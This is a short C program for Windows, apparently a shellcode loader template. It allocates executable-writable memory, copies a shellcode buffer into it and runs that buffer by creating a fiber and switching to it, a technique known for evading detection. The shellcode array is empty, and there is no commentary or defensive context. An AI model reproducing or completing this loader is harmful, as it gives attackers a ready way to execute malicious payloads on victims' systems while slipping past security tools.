#include <Windows.h>

int main()
{

		PVOID mainFiber = ConvertThreadToFiber(NULL);

		unsigned char shellcode[] ="";

	PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(shellcodeLocation, shellcode, sizeof shellcode);


		PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);


		SwitchToFiber(shellcodeFiber);

	return 0;
}
